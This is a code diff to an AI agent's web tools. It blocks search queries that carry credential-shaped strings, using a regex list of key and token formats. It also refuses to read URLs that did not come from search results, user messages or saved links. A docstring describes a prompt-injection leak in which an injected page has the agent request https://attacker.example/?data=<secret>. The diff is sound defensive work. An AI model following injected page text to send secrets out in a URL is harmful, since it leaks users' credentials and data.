@@ -33,6 +33,46 @@ except ImportError:
     DDGS = None
 
 
+
+_URL_IN_TEXT = re.compile(r"https?://[^\s<>\"'`]+")
+
+
+# Credential shapes a search query must never carry to a provider.
+_SECRET_LIKE = re.compile(
+    r"-----BEGIN [A-Z ]*(?:PRIVATE )?KEY-----"
+    r"|\b(?:sk|pk|rk)[-_](?:live_|test_|proj-)?[A-Za-z0-9_-]{16,}"
+    r"|\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{20,}|\bgithub_pat_[A-Za-z0-9_]{20,}"
+    r"|\bxox[abprs]-[A-Za-z0-9-]{10,}|\bAKIA[0-9A-Z]{16}\b|\bAIza[0-9A-Za-z_-]{30,}"
+    r"|\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}"
+)
+# Dashes and slashes split words and URL paths; keys with them match above.
+_LONG_TOKEN = re.compile(r"[A-Za-z0-9_+=]{32,}")
+
+
+def _refuse_secret_like_query(tool: str, query: str) -> None:
+    """A search query goes to the provider as written, so one that looks
+    like it holds a key or token is not sent."""
+
+    text = query if isinstance(query, str) else ""
+    if _SECRET_LIKE.search(text) or any(
+        re.search(r"[A-Za-z]", token) and re.search(r"\d", token)
+        for token in _LONG_TOKEN.findall(text)
+    ):
+        raise ToolExecutionError(
+            tool,
+            "This query looks like it contains a key or token, so it was not sent. "
+            "Search without it.",
+        )
+
+
+def _comparable_url(url: str) -> str:
+    """One form per page: no fragment, no trailing slash or punctuation."""
+    try:
+        normalized = _normalize_web_url(url.rstrip(".,;:!?)]}>"))
+    except ValueError:
+        return ""
+    return normalized.split("#", 1)[0].rstrip("/")
+
 def _positive_int(value) -> bool:
     return isinstance(value, int) and not isinstance(value, bool) and value >= 1
 
@@ -993,6 +1033,7 @@ class WebTools:
         Search the web using the best available provider.
         Tier: configured provider > Brave > Tavily > DuckDuckGo (free default).
         """
+        _refuse_secret_like_query("search_web", query)
         provider = self.search_cfg.get("provider", "auto")
         brave_key = brave_api_key()
         tavily_key = tavily_api_key()
@@ -1015,12 +1056,12 @@ class WebTools:
         else:
             results = await self._search_duckduckgo(query, limit, freshness)
             fallback_provider = "duckduckgo"
-        return self._with_search_source_contexts(
+        return self._remember_result_urls(self._with_search_source_contexts(
             results,
             source_kind="web_search_result",
             query=query,
             fallback_provider=fallback_provider,
-        )
+        ))
 
     async def search_news(
         self, query: str, limit: int = 5, freshness: str = None
@@ -1028,6 +1069,7 @@ class WebTools:
         """
         Search for news articles. Requires Brave Search API key.
         """
+        _refuse_secret_like_query("search_news", query)
         brave_key = brave_api_key()
         if not brave_key:
             return [
@@ -1041,12 +1083,46 @@ class WebTools:
                 }
             ]
         results = await self._news_brave(query, limit, brave_key, freshness or "pw")
-        return self._with_search_source_contexts(
+        return self._remember_result_urls(self._with_search_source_contexts(
             results,
             source_kind="news_search_result",
             query=query,
             fallback_provider="brave",
-        )
+        ))
+
+    def _remember_result_urls(self, results: List[Dict]) -> List[Dict]:
+        known = self.__dict__.setdefault("_search_result_urls", set())
+        for result in results:
+            if isinstance(result, dict) and result.get("url"):
+                known.add(_comparable_url(result["url"]))
+        return results
+
+    async def web_url_is_known(self, url: str) -> bool:
+        """Whether a URL came from somewhere other than the model's own choice:
+        a search result or a page read in this run, the user's messages, or a
+        saved link. An injected page could otherwise have the agent read
+        https://attacker.example/?data=<secret> and leak it in the request."""
+
+        wanted = _comparable_url(url)
+        if wanted in self.__dict__.get("_search_result_urls", ()):
+            return True
+        run = getattr(self, "agent_run", None)
+        if run is not None:
+            texts = [run.user_query, *(
+                turn.get("content") or "" for turn in run.history if turn.get("role") == "user"
+            )]
+            if any(wanted == _comparable_url(found) for text in texts
+                   for found in _URL_IN_TEXT.findall(text or "")):
+                return True
+        service = getattr(self, "document_service", None)
+        if service is not None:
+            try:
+                links = await service.list_saved_web_links(limit=1000)
+            except Exception:
+                links = []
+            if any(wanted == _comparable_url(link.get("url", "")) for link in links):
+                return True
+        return False
 
     async def read_web_page(
         self,
@@ -1080,11 +1156,23 @@ class WebTools:
             requested_url = _normalize_web_url(url)
         except ValueError as exc:
             raise _web_page_error(str(exc)) from exc
+        if not await self.web_url_is_known(requested_url):
+            raise _web_page_error(
+                "This link did not come from a search result in this run, the user's "
+                "messages, or the project's saved links, so it is not read. Ask the user "
+                "to send the link in a message if they want it read."
+            )
 
         snapshot = self._get_web_page_snapshot(requested_url)
         if snapshot is None:
             snapshot = await self._fetch_web_page_snapshot(requested_url)
             self._store_web_page_snapshot(snapshot)
+            # A link written on a page the run read may be followed: its exact
+            # URL was not built by the model, so it cannot carry the user's data.
+            texts = snapshot.pages if isinstance(snapshot, _WebPdfSnapshot) else (snapshot.text,)
+            self._remember_result_urls([
+                {"url": found} for text in texts for found in _URL_IN_TEXT.findall(text or "")
+            ])
 
         if isinstance(snapshot, _WebPdfSnapshot):
             return self._read_web_pdf_page(
